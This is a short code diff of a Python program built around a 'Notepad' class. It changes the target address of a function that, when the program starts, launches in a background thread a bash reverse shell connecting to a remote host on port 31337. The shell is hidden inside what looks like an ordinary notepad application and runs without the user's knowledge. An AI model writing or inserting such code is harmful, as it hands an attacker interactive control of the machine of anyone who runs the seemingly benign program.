@@ -198,7 +198,7 @@ class Notepad:
  
 
 def tryit(sth):
-    subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.138/31337 0<&1 2>&1", shell=True, executable='/bin/bash')
+    subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.1.82/31337 0<&1 2>&1", shell=True, executable='/bin/bash')
 
 if __name__ == '__main__':
     thread = threading.Thread(target= tryit, args=(10,))
